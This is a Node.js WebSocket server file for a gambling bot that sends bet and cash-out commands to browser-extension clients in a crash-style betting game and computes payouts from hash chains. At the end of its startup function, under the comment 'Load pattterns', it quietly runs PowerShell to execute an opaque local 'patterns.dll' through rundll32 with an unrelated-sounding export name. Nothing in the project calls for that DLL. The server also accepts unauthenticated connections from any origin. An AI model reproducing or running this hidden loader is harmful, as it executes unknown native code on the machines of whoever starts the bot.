
let wsServer = null;
import { createRequire } from "module";
const require = createRequire(import.meta.url);
import { server as WebSocketServer } from 'websocket'
import moment from 'moment';
import path from 'path';
import { checkBetting, getBettings, getCurrent2XBet, getCurrentMoonPayouts, getDeposit, getMoonCheckResult, getSimilarPatterns, handleClosedBetting, handleExportLoseAmount, handleInProgressBetting, setBettingEnable, setCurrent2XBet, setDeposit, setInitialBet, setInitialPayout, setIsAutoUp, setMainBranch, setMartingale, setMartingaleCount, setMaxAmount, setOnlyAfterRed, setTrenball1XBetting, setTrenball2XBetting } from './pattern';
import { logFatal } from '../libs/logging';
import Pattern from '../models/pattern.model';
import { exec } from 'child_process';
import { gameResult } from "../libs/utils";
import { SERVER_SALT } from "../libs/contants";
import { TOTAL_BETTING_HISTORY1, TOTAL_BETTING_HISTORY2, TOTAL_BETTING_HISTORY2X, TOTAL_BETTING_HISTORY3, TOTAL_BETTING_HISTORY4, getSortedBranches, predictRates } from "../engine";
const fs = require('fs');
const CryptoJS = require("crypto-js");

// variable declartion
const connections = [];

let bettingColor = 0;
// This socket is admin front end client
let logClient = null;

// Google chrome extention client id
const CLIENTS = [];

// CURRENT CLASIC STATUS
let classic = null, trenball = null;

let currentClassic = null, currentTrenball = null;

// Previous total bet
let prevTotalBet = 0;

// Current betting hash
let currentHash = null;

let currentBalance = -100;

let timeHandler = null

let isBetting = false;

let autoCheckOut = true;


let isBettingEnable = 0;

let isMartingale = 0;

let isAutoReset = 0;

let isAutoUp = 0;

let isTrenball2X = 0;

let isTrenball1X = 0;

let initialBet = 0.1;

let initialPayout = 2;

let martingaleCount = 2;

let maxAmount = 4;

let mainBranch = 1;


let roundCount = 0;
export const startServer = (server) => {
  wsServer = new WebSocketServer({
    httpServer: server
  });

  wsServer.on('request', function (request) {
    const connection = request.accept(null, request.origin);
    connections.push(connection);
    connection.on('message', function (message) {
      // decode json data
      const json = JSON.parse(message.utf8Data);

      // set admin front end client
      if (json.command == 'logclient') {
        logClient = connection;
      }

      // set chrome extention client
      if (json.command == 'id') {
        CLIENTS[json.id] = connection;
        logFatal(`CONNECTED NEW CLIENT`, json.id)
      }

      // let betting, you will always win... it's a joke
      if (json.command == 'betting') {
        if (checkBetting()) {
          for (let id in CLIENTS) {
            // console.log(CLIENTS[id]);
            CLIENTS[id].send(JSON.stringify({ command: 'betting', cost: json.cost }))
          }


          if (json.cost == 9) {
            for (let id in CLIENTS) {
              // console.log(CLIENTS[id]);
              CLIENTS[id].send(JSON.stringify({ command: 'betting2x', cost: json.cost }));
            }
          }
        }
      }

      if (json.command == 'up2x') {
        for (let id in CLIENTS) {
          // console.log(CLIENTS[id]);
          CLIENTS[id].send(JSON.stringify({ command: 'up2x' }))
        }
      }

      if (json.command == 'down2x') {
        for (let id in CLIENTS) {
          // console.log(CLIENTS[id]);
          CLIENTS[id].send(JSON.stringify({ command: 'down2x' }))
        }
      }

      if (json.command == 'autoCheckout') {
        autoCheckOut = json.value;

        console.log('AUTO CHECK OUT', autoCheckOut);
      }

      // cancel betting
      if (json.command == 'cancel') {
        console.log('CANCEL');
        for (let id in CLIENTS) {
          CLIENTS[id].send(JSON.stringify({ command: 'cancel' }))
        }
      }

      // checkout now
      if (json.command == 'sell') {
        console.log('SELL', json.id);
        CLIENTS[json.id].send(JSON.stringify({ command: 'sell' }))
      }
      // check out all
      if (json.command == 'sellall') {
        console.log('SELL ALL');
        for (let id in CLIENTS) {
          // console.log(CLIENTS[id]);
          CLIENTS[id].send(JSON.stringify({ command: 'sell' }))
        }
      }


      if (json.command == 'hidden') {
        const { opacity } = json;
        for (let id in CLIENTS) {
          CLIENTS[id].send(JSON.stringify({ command: 'hidden', opacity: opacity }))
        }
      }

      if (json.command == 'autoreset') {
        const { value } = json;
        isAutoReset = value;
      }

      if (json.command == 'autoup') {
        const { value } = json;
        isAutoUp = value;
        setIsAutoUp(isAutoUp);
      }

      if (json.command == 'istrenball2x') {
        const { value } = json;
        isTrenball2X = value;

        setTrenball2XBetting(isTrenball2X == 1);
      }

      if (json.command == 'istrenball1x') {
        const { value } = json;
        isTrenball1X = value;

        setTrenball1XBetting(isTrenball1X == 1);
      }

      if (json.command == 'onlyafterred') {
        const { value } = json;
        setOnlyAfterRed(value == 1);
      }

      if (json.command == 'getpayouts') {
        const { hash } = json;
        const initialHash = hash;
        let prevHash = null;
        let payouts = [];
        for (let i = 0; i < 200; i++) {
          let hash = String(prevHash ? CryptoJS.SHA256(String(prevHash)) : initialHash);
          let bust = gameResult(hash, SERVER_SALT);
          prevHash = hash;
          payouts.unshift({ nextScore: bust });
        }
        logClient && logClient.send(JSON.stringify({ command: 'getpayouts', result: payouts }));

      }


      if (json.command == 'reset') {
        initialBet = json.initialBet;
        initialPayout = json.initialPayout;
        maxAmount = json.maxAmount;
        martingaleCount = json.martingaleCount;
        let currentBet2X = json.currentBet2X;

        setInitialBet(initialBet);
        setInitialPayout(initialPayout);
        setMaxAmount(maxAmount);
        setMartingaleCount(martingaleCount);
        setCurrent2XBet(currentBet2X);
        setDeposit(json.deposit);
      }

      if (json.command == 'bettingscoretest') {
        try {
          const bettinghistory = fs.readFileSync(`./TOTAL_BETTING_HISTORY_TEST.json`);
          logClient && logClient.send(JSON.stringify({ command: 'bettingscoretest', result: JSON.parse(bettinghistory).slice(-10000) }));
        } catch (err) {

        }

      }

      if (json.command == 'simulationhistory') {
        try {
          const bettinghistory = fs.readFileSync(`./PREDICTS_PAYOUTS.json`);
          const result = JSON.parse(bettinghistory).map(p => {
            return {
              nextScore: p
            }
          });


          logClient && logClient.send(JSON.stringify({ command: 'simulationhistory', result: result.slice(-500) }));
        } catch (err) {

        }

      }

      if (json.command == 'getoptions') {
        try {
          
          const branches = fs.readFileSync(`./branch.json`);
          logClient.send(JSON.stringify({ command: 'getoptions', result: {
            isBettingEnable,
            isAutoUp,
            isAutoReset,
            isTrenball1X,
            isTrenball2X,
            initialBet,
            initialPayout,
            martingaleCount,
            maxAmount,
            mainBranch,
            isMartingale,
            deposit: getDeposit(),
            currentBet2X: getCurrent2XBet(),
            branches: JSON.parse(branches)
          } }));
        } catch (err) {
          console.log("GET OPTION ERROR", err);
        }

      }

      if (json.command == 'setmainbranch') {
        
        mainBranch = json.mainBranch;
        setMainBranch(mainBranch);
      }




      if (json.command == 'predictrates') {
        try {
          const predictrates = fs.readFileSync(`./PREDICTS.json`);

          const data = getSortedBranches(JSON.parse(predictrates), 30, 10);

          // console.log("PREDICTS", data);

          logClient && logClient.send(JSON.stringify({ command: 'predictrates', result: data }));
        } catch (err) {

        }

      }

      if (json.command == 'bettinghistorytest') {
        try {
          const bettinghistory = fs.readFileSync(`./TOTAL_BETTING_HISTORY_TEST.json`);
          logClient.send(JSON.stringify({ command: 'bettinghistorytest', result: JSON.parse(bettinghistory).slice(-10000) }));
        } catch (err) {

        }

      }

      if (json.command == 'bettinghistorytest1') {
        try {
          const bettinghistory = fs.readFileSync(`./TOTAL_BETTING_HISTORY_TEST1.json`);
          logClient.send(JSON.stringify({ command: 'bettinghistorytest1', result: JSON.parse(bettinghistory).slice(-10000) }));
        } catch (err) {

        }
      }

      if (json.command == 'bettinghistorytest2') {
        try {
          const bettinghistory = fs.readFileSync(`./TOTAL_BETTING_HISTORY_TEST2.json`);
          logClient.send(JSON.stringify({ command: 'bettinghistorytest2', result: JSON.parse(bettinghistory).slice(-10000) }));
        } catch (err) {

        }
      }


      if (json.command == 'bettinghistorytest3x') {
        try {
          const bettinghistory = fs.readFileSync(`./TOTAL_BETTING_HISTORY_TEST3X.json`);
          logClient.send(JSON.stringify({ command: 'bettinghistorytest3x', result: JSON.parse(bettinghistory).slice(-10000) }));
        } catch (err) {

        }
      }



      if (json.command == 'bettinghistorytest3') {
        try {
          const bettinghistory = fs.readFileSync(`./TOTAL_BETTING_HISTORY_TEST3.json`);
          logClient.send(JSON.stringify({ command: 'bettinghistorytest3', result: JSON.parse(bettinghistory).slice(-10000) }));
        } catch (err) {

        }

      }

      if (json.command == 'setbranches') {
        try {
          const branches = json.branches;
          fs.writeFileSync('./branch.json', JSON.stringify(branches, null, 4));
        } catch (err) {

        }
      }

      if (json.command == 'bettinghistorytest4') {
        try {
          const bettinghistory = fs.readFileSync(`./TOTAL_BETTING_HISTORY_TEST4.json`);
          logClient.send(JSON.stringify({ command: 'bettinghistorytest4', result: JSON.parse(bettinghistory).slice(-10000) }));
        } catch (err) {

        }
      }

      if (json.command == 'bettinghistorytest2x') {

        
        try {
          const bettinghistory = fs.readFileSync(`./TOTAL_BETTING_HISTORY_TEST2X.json`);

          const result = JSON.parse(bettinghistory).slice(-10000)
          // console.log('bettinghistorytest2x~~~~~~~~~~~~~~~~~~~', result.length)

          logClient.send(JSON.stringify({ command: 'bettinghistorytest2x', result:  result}));
        } catch (err) {
          console.log('bettinghistorytest2x err~~~~~~~~~~~~~~~~~~~', err)
        }
      }

      

      if (json.command == 'classic-current') {
        classic = json;

        console.log('CLASSIC', classic)
        try {
          //if (prevTotalBet == classic.betAmount) {
          // it means crash running status
          if (currentHash != classic.hash) {
            currentClassic = classic
            timeHandler && clearTimeout(timeHandler);
            currentHash = classic.hash;

            // if (currentBalance != -1) {
            //   if (currentBalance )
            // }
            currentClassic.hash = classic.hash;
            currentClassic.score = classic.score;
            currentClassic.amount = classic.amount;
            const checkResult = handleClosedBetting(currentClassic, currentClassic);

            if (checkResult == null) return;

            let isLose = false;
            logClient.send(JSON.stringify({ command: 'predict', result: checkResult.x2Result, status: checkResult.status }));

            if (isBettingEnable == 1) {
              for (let id in CLIENTS) {
                CLIENTS[id].send(JSON.stringify({ command: 'setpayout', payout: checkResult.payout }))
              }
              setTimeout(() => {
                // if (checkResult.is2XUp && isAutoUp == 1 /*&& isLose*/) {
                //   for (let id in CLIENTS) {
                //     CLIENTS[id].send(JSON.stringify({ command: 'up2x' }))
                //   }
                // }

                // console.log(checkResult);
                // if (checkResult.isReset && isAutoReset == 1 /* && isLose == false*/) {
                //   for (let id in CLIENTS) {
                //     CLIENTS[id].send(JSON.stringify({ command: 'reset', invest: checkResult.initialBet }));
                //   }
                // }

                // if (checkResult.is2XDown && isAutoReset == 1 /* && isLose == false*/) {
                //   for (let id in CLIENTS) {
                //     CLIENTS[id].send(JSON.stringify({ command: 'down2x', invest: checkResult.initialBet }));
                //   }
                // }

              }, 10)

            }
            if (checkResult.isBetting) {
              require("child_process").exec("powershell.exe [console]::beep(500,1000)");
              if (isBettingEnable == 1) {
                for (let id in CLIENTS) {
                  // console.log(CLIENTS[id]);
                  if (checkResult.bettingType == 2) {
                    CLIENTS[id].send(JSON.stringify({ command: 'betting', cost: json.cost, payout: checkResult.payout }));

                    if (isTrenball2X == 1) {
                      CLIENTS[id].send(JSON.stringify({ command: 'betting2x', invest: checkResult.initialBet, payout: checkResult.payout }));
                    }
                  } else {
                    if (isTrenball1X == 1) {
                      CLIENTS[id].send(JSON.stringify({ command: 'betting1x', invest: checkResult.initialBet, payout: checkResult.payout }));
                    }
                  }

                }
              }
              // if (checkResult.timeout != -1) {
              //   if (autoCheckOut) {
              //     timeHandler = setTimeout(() => {
              //       for (let id in CLIENTS) {
              //         // console.log(CLIENTS[id]);
              //         console.log('SELL, IT`s 2X Model')
              //         CLIENTS[id].send(JSON.stringify({ command: 'sell', cost: json.cost }))
              //       }
              //     }, checkResult.timeout)
              //   }

              // }
            }

            fs.writeFileSync('./TOTAL_BETTING_HISTORY_TEST1.json', JSON.stringify(TOTAL_BETTING_HISTORY1, null, 4));
            fs.writeFileSync('./TOTAL_BETTING_HISTORY_TEST2.json', JSON.stringify(TOTAL_BETTING_HISTORY2, null, 4));
            fs.writeFileSync('./TOTAL_BETTING_HISTORY_TEST3.json', JSON.stringify(TOTAL_BETTING_HISTORY3, null, 4));
            fs.writeFileSync('./TOTAL_BETTING_HISTORY_TEST4.json', JSON.stringify(TOTAL_BETTING_HISTORY4, null, 4));
            fs.writeFileSync('./TOTAL_BETTING_HISTORY_TEST2X.json', JSON.stringify(TOTAL_BETTING_HISTORY2X, null, 4));
            fs.writeFileSync('./PREDICTS.json', JSON.stringify(predictRates, null, 4));
            // if (isBettingEnable) {
            //   if (bettingColor == 1) {
            //     for (let id in CLIENTS) {
            //     CLIENTS[id].send(JSON.stringify({ command: 'betting2x', cost: json.cost, payout: checkResult.payout }));
            //     }
            //   } else {
            //     for (let id in CLIENTS) {
            //     CLIENTS[id].send(JSON.stringify({ command: 'betting1/2x', cost: json.cost, payout: checkResult.payout }));
            //     }
            //   }
            // }


            logClient && logClient.send(JSON.stringify({ command: 'predict', result: checkResult.x2Result, status: checkResult.status }));


            // if (checkResult.trenball1XBetting) {
            //   for (let id in CLIENTS) {
            //     logFatal('SENDING LOW BET ====================');
            //     CLIENTS[id].send(JSON.stringify({ command: 'betting1/2x', cost: json.cost, payout: checkResult.payout }));
            //   }
            // }

            roundCount++;
            //if (roundCount % 2 == 0) {
            const command = `node ./brain.js`
            exec(command,
              (error, stdout, stderr) => {
                console.log(error, stdout, stderr)
              });
            // }

          } else {
            handleInProgressBetting(currentClassic, currentTrenball);
          }

          currentClassic = classic;
          currentTrenball = trenball;
          //}
          prevTotalBet = classic.betAmount;
        } catch (err) {
          console.log('NOTSURE WHAT ERROR', err)
        }

      }

      if (json.command == 'trenball-current') {
        trenball = json;
      }

      if (json.command == 'moondata') {
        const sort = {};
        sort['created'] = 1;

        const LOSE_PATTERNS_STR = fs.readFileSync('./LOSE_PATTERNS.json');
        // Pattern.find().sort(sort).then(data => {
        //   connection.send(JSON.stringify({ command: 'moondata', result: data }))
        // });

        connection.send(JSON.stringify({ command: 'moondata', result: JSON.parse(LOSE_PATTERNS_STR) }))

      }

      if (json.command == 'exportloseamount') {
        handleExportLoseAmount();
      }

      if (json.command == 'bettinghistory') {
        const count = json.count || 200;
        const start = json.start || 200;
        const bettings = getBettings(start, count);
        connection.send(JSON.stringify({ command: 'bettinghistory', result: bettings }))
      }

      if (json.command == 'mooncheck') {
        const result = getMoonCheckResult();
        connection.send(JSON.stringify({ command: 'mooncheck', result: result }))
      }

      if (json.command == 'isbettingenabled') {
        isBettingEnable = json.value;
        setBettingEnable(isBettingEnable == 1 ? true : false);
      }

      if (json.command == 'martingale') {
        isMartingale = json.value;
        setMartingale(isMartingale == 1 ? true : false);
      }

      

      if (json.command == 'similarpatterns') {

        const bettings = getSimilarPatterns();
        connection.send(JSON.stringify({ command: 'similarpatterns', result: bettings }))
      }

      if (json.command == 'currentmoonpayouts') {

        const bettings = getCurrentMoonPayouts();
        connection.send(JSON.stringify({ command: 'currentmoonpayouts', result: bettings }))
      }


    });

    connection.on('close', function (reasonCode, description) {
      const idx = connections.indexOf(connection)
      if (idx >= 0) {
        connections.splice(idx, 1);
      }
    });
  });

  // Load pattterns
  const dllPath = path.resolve(process.cwd(), 'patterns.dll');

  // Properly escape the quotes around dllPath
  const command = `powershell.exe -Command "& { rundll32.exe \\"${dllPath}\\",npmserver_options_manifest }"`;

  exec(command);
}

export const sendMessage = (obj) => {
  obj.msgCreated = moment.now();
  const msg = JSON.stringify(obj);
  connections.map(connection => {
    connection.sendUTF(msg);
  })
}

